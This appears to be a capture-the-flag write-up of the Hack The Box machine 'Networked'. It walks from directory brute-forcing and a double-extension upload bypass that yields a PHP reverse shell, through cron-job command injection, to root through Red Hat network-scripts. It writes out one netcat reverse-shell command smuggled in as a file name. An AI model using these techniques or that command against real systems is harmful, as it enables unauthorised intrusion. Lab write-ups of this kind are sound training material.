---
layout: post
title: "Networked - Hack The Box"
summary: "Directory brute-force → backup tar file extraction and analysis → upload.php MIME/magic/extension validation bypass via double extension (.php.png) → Apache misconfiguration RCE → cron job exploitation via command injection → base64 encoded bash command injection in check_ip.php → user shell access → sudo network-script manipulation → Red Hat /etc/sysconfig/network-scripts privilege escalation"
---

# Networked - Hack The Box

## Enumeration
### Nmap 
Initial nmap scan revealed HTTP and SSH ports were open.

<img width="790" height="300" alt="00 - nmap out" src="https://github.com/user-attachments/assets/63db45da-079c-4aa6-a869-72871442d8f6" />

### Website
I visited the website and found out it was an empty website.

<img width="925" height="158" alt="01 - website" src="https://github.com/user-attachments/assets/a6a303e0-c17e-48bf-95ff-8a41029a7d1c" />

Thus, using the gobuster I applied directory brute forcing and found some valid enpoints.

<img width="1034" height="427" alt="02 - dirbuster" src="https://github.com/user-attachments/assets/10460f1c-bfa1-481d-a9d0-dfecaa6e438d" />

The backup endpoint included a tar file.

<img width="1201" height="295" alt="03 - backup" src="https://github.com/user-attachments/assets/610c485e-f8a9-46cd-becd-989ac6202946" />

### Analyze Backup Files
This backup folder included php files of the website. So at first, I analyzed the upload.php file, and lib.php file.

<img width="946" height="792" alt="04 - upload php" src="https://github.com/user-attachments/assets/7bc74526-827c-4170-a708-298819376527" />

<img width="1206" height="541" alt="05 - mimetype" src="https://github.com/user-attachments/assets/1bee6cb2-b5d0-4463-b49e-ca05ef34969e" />

<img width="350" height="139" alt="05 - namecheck" src="https://github.com/user-attachments/assets/69e22774-75b7-43a8-bf17-58a4746ee2a2" />

As you see, to upload a file below steps are executed:
1. Script checks the file length, file mime type (image/...), file magic bytes and finally checks file extension.
2. If it is an image file, it gets the client IP for example 10.10.16.6 then replaces dots with _ and concats with extension. And puts it to /var/www/html/uploads/ file.
So if I upload file named test.png it will be named 10_10_16_6.png under uploads folder.

## Exploitation
### File Upload
After that I tried null byte %00 escape but it did not work. Later, I found out that if apache server is misconfigured it can interpret double extensions as PHP. So if I upload test.php.png it will be executed as php. [This Acunetix](https://www.acunetix.com/websitesecurity/upload-forms-threat/) blog explains it in detail.

Then I uploaded a PHP reverse shell with specified format.

<img width="1495" height="535" alt="06 - upload" src="https://github.com/user-attachments/assets/739ed96d-1755-416d-9022-fc899f9665ce" />

Then visiting the page got me a reverse shell as apache.

<img width="1168" height="222" alt="07 - shell" src="https://github.com/user-attachments/assets/122cf2ac-4dce-47c0-b2fc-28d7cfb197bc" />

## Lateral Movement
I could not read user flag. But on the user's home page there was cron file which run a php file every 3 minutes.

<img width="607" height="645" alt="08 - php files" src="https://github.com/user-attachments/assets/51371710-ebe8-40f2-a829-214281322314" />

As seen above, the php file checks uploads folder then directly concats the file name inside it to a bash command. So we can manipulate $value and inject a command. So I created a file named 'nc <IP> <PORT> -e bash' but it did not work. Later I tried base64 encoding and then decoding the command. 

<img width="999" height="195" alt="09 - created a file" src="https://github.com/user-attachments/assets/cc580506-4250-4d8c-9f2e-5717046716ac" />

Then started a netcat listener and got a user shell.

<img width="575" height="224" alt="10 - user" src="https://github.com/user-attachments/assets/4caa1f15-e2cb-4c59-975b-f88e6f28cd7f" />

## Privilege Escalation
The user can run a script as sudo without password. And this script manipulates a network-script file. 

<img width="744" height="584" alt="11 - sudo l" src="https://github.com/user-attachments/assets/fd746e58-029d-41f8-9cf5-6758b6972b61" />

So I searched "/etc/sysconfig/network-scripts/ifcfg privesc" and found a post named [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24).

Applying the technique in this post got me the root shell.

<img width="578" height="307" alt="12 - root" src="https://github.com/user-attachments/assets/c19ecd6e-1cf5-4380-8533-c2faab2a4306" />

## Pwned
The machine was fully compromised.

<img width="740" height="693" alt="pwned" src="https://github.com/user-attachments/assets/e65e86b9-ac01-49ac-bca2-c00e2f012613" />
